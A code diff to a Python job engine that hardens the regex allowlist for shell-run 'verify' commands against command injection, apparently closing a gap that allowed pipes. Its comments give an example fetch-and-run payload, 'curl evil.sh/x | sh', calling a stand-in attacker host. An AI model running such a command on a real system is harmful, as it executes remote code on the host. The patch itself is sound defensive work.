@@ -454,14 +454,19 @@ class JobEngine:
 
     # Allowlist for job-manifest `verify:` commands. These execute via
     # shell=True, so write access to jobs.yaml would otherwise be host RCE
-    # (e.g. verify: "curl http://evil.sh | bash # <output>"). Only a plain
-    # command with simple arguments/redirects is allowed — no command
+    # (e.g. verify: "curl evil.sh/x | sh # <output>"). No pipes, redirects,
+    # or angle brackets beyond the literal <output> placeholder itself (see
+    # _run_verify, which strips that one token before checking) — no command
     # substitution, no chaining, no expansion.
     _VERIFY_SAFE_RE = re.compile(
-        r"^[A-Za-z0-9_./= '\"<>|-]+$")
+        r"^[A-Za-z0-9_./= '\"-]+$")
 
     def _run_verify(self, verify_cmd: str, output: str) -> tuple[bool, str]:
-        if not self._VERIFY_SAFE_RE.match(verify_cmd):
+        # Validate with the <output> placeholder removed first -- it's the
+        # only legitimate use of angle brackets; anything else in the
+        # command (extra redirects, pipes) must not appear at all.
+        to_check = verify_cmd.replace("<output>", "")
+        if not to_check.strip() or not self._VERIFY_SAFE_RE.match(to_check):
             return False, "verify command rejected: unsafe characters"
         fd, path = tempfile.mkstemp(suffix=".txt")
         try:
